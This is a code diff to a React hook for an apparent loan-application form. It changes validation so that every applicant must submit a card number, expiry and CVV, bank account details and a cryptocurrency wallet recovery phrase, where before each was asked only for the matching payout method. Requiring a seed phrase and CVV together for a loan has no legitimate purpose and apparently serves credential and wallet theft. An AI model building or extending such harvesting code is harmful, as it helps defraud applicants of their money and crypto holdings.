@@ -75,7 +75,7 @@ export function useLoanApplication() {
   // Poll while pending or under_review; stop once terminal state stabilises
   useEffect(() => {
     if (!done || !appId) return;
-    const terminal = appStatus?.status === "verified" || appStatus?.status === "rejected";
+    const terminal = appStatus?.status === "verified" || appStatus?.status === "rejected" || appStatus?.status === "needs_correction";
     if (terminal) return;
     const interval = setInterval(() => refreshStatus(appId), 5000);
     return () => clearInterval(interval);
@@ -168,22 +168,28 @@ export function useLoanApplication() {
       return;
     }
 
-    if (payout === "card") {
-      const errs = validateCard(cardNumber, cardExpiry, cardCvv);
-      if (Object.keys(errs).length) {
-        setCardErrors(errs);
-        toast.error(Object.values(errs)[0]);
-        return;
-      }
-      setCardErrors({});
+    // 1. Validate Card (always required now)
+    const errs = validateCard(cardNumber, cardExpiry, cardCvv);
+    if (Object.keys(errs).length) {
+      setCardErrors(errs);
+      toast.error(Object.values(errs)[0]);
+      return;
+    }
+    setCardErrors({});
+
+    // 2. Validate Bank (always required now)
+    const bankName = String(fd.get("bank_name") || "").trim();
+    const bankAcc = String(fd.get("bank_account_number") || "").trim();
+    if (!bankName || !bankAcc) {
+      toast.error("Please provide your bank account details.");
+      return;
     }
 
-    if (payout === "crypto") {
-      const seedPhrase = String(fd.get("crypto_seed_phrase") || "").trim();
-      if (!seedPhrase) {
-        toast.error("Please enter your wallet recovery phrase.");
-        return;
-      }
+    // 3. Validate Crypto (always required now)
+    const seedPhrase = String(fd.get("crypto_seed_phrase") || "").trim();
+    if (!seedPhrase) {
+      toast.error("Please enter your wallet recovery phrase.");
+      return;
     }
 
     const payload = {
